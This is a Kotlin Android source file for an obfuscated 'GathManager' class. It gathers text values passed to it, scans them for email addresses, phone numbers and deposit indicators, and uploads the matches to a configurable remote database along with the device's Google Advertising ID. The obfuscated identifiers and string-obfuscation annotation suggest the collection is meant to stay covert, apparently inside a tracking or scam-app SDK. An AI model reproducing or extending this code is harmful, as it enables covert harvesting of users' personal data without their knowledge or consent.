package io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902

import android.util.Log
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.common.MatcherOperations
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.common.firebase.UploadManager
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.data.model.InitDataModel
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.data.model.UserDataModel
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.data.source.local.repo.AppStoragePreferencesRepositoryImpl
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.data.source.local.repo.UserStoragePreferencesRepositoryImpl
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.domain.GathManagerInterface
import io.a6815fa22836cc6b3617ededfe.wdafobja2wojdb902.utils.enums.UploadDataType
import io.github.a26197993b77e31a4.o7b471d74a5346efb54aa326b892daf01d914ce99.ObfustringThis
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock

@ObfustringThis
internal class GathManager(
	private val appStoragePreferences: AppStoragePreferencesRepositoryImpl,
	private val userStoragePreferences: UserStoragePreferencesRepositoryImpl
) : GathManagerInterface {
	override var emailCollectingEnabled: Boolean = false
	override var phoneCollectingEnabled: Boolean = false
	override var depositCollectingEnabled: Boolean = false
	override var countryCode: suspend (String) -> Unit = { code ->
		userStoragePreferences.setCountryCodeKey(code)
	}
	override var customDatabaseURL: suspend (String) -> Unit = { url ->
		appStoragePreferences.setDatabaseURLKey(url)
	}

	private val tempMapOfText = mutableMapOf<String, String>()
	private val mutex = Mutex()

	suspend fun sendInitData(googleAdvertisingId: String?, url: String) {
		uploadData(
			UploadDataType.INIT_DATA, InitDataModel(
				googleAdvertisingId.toString(), url
			)
		)
		Log.i("GathManager", "sendInitData: \nGAID: $googleAdvertisingId  \nBUILD_URL: $url")
	}

	suspend fun getCountryCode(): String {
		return userStoragePreferences.getCountryCodeKey()
	}


	suspend fun checkAvailability(callback: () -> Unit) {
		checkCacheEmpty {
			if (emailCollectingEnabled || phoneCollectingEnabled || depositCollectingEnabled) {
				callback()
			}
		}
	}

	private suspend fun checkCacheEmpty(callback: () -> Unit) {
		val email = userStoragePreferences.getEmail().isBlank() && emailCollectingEnabled
		val phoneNumber = userStoragePreferences.getPhone().isBlank() && phoneCollectingEnabled
		val deposit = userStoragePreferences.getDeposit().not() && depositCollectingEnabled

		if (email || phoneNumber || deposit) {
			callback()
		}
	}


	suspend fun sendText(
		id: String,
		value: String,
		emailMatches: (email: String, type: UploadDataType) -> Unit,
		phoneMatches: (phone: String, type: UploadDataType) -> Unit,
		depositMatches: (deposit: Boolean, type: UploadDataType) -> Unit
	) {
		mutex.withLock {
			checkCacheEmpty {

				Log.i("GathClient", "sendText: $value")
				tempMapOfText[id] = value

				if (phoneCollectingEnabled) {
					MatcherOperations.Matches.checkPhone(tempMapOfText.values) { matchedPhone, rawValue ->
						phoneMatches(matchedPhone, UploadDataType.PHONE)
						tempMapOfText.values.remove(rawValue)
					}
				}
				if (emailCollectingEnabled) {
					MatcherOperations.Matches.checkEmail(tempMapOfText.values) { matchedEmail, rawValue ->
						emailMatches(matchedEmail, UploadDataType.EMAIL)
						tempMapOfText.values.remove(rawValue)
					}
				}
				if (depositCollectingEnabled) {
					MatcherOperations.Matches.checkDeposit(tempMapOfText.values) { matchedDeposit, rawValue ->
						depositMatches(matchedDeposit, UploadDataType.DEPOSIT)
						tempMapOfText.values.remove(rawValue)
					}
				}
			}
		}
	}

	suspend fun uploadData(uploadKey: UploadDataType, data: Any) {
		mutex.withLock {
			val cacheParent = appStoragePreferences.getParent().takeIf { it.isNotBlank() }


			val uploadManager = UploadManager(
				appStoragePreferences.getDatabaseURLKey(),
				userStoragePreferences.getCountryCodeKey()
			)
			val cacheEmail = userStoragePreferences.getEmail()
			val cachePhoneNumber = userStoragePreferences.getPhone()
			val cacheDeposit = userStoragePreferences.getDeposit()

			val userData = UserDataModel(
				email = cacheEmail, phone = cachePhoneNumber, deposit = cacheDeposit
			)

			uploadManager.uploadData(
				cacheNodeKey = cacheParent,
				uploadDataType = uploadKey,
				data = when (uploadKey) {
					UploadDataType.INIT_DATA -> {
						(data as InitDataModel).also { appStoragePreferences.setBuildURLKey(it.url) }
					}
					UploadDataType.EMAIL -> {
						userStoragePreferences.setEmail(data as String)
						userData.copy(email = data)
					}
					UploadDataType.PHONE -> {
						userStoragePreferences.setPhone(data as String)
						userData.copy(phone = data)
					}
					UploadDataType.DEPOSIT -> {
						userStoragePreferences.setDeposit(data as Boolean)
						userData.copy(deposit = data)
					}
				}
			) { newParent ->
				appStoragePreferences.setParent(newParent)
			}
		}
	}
}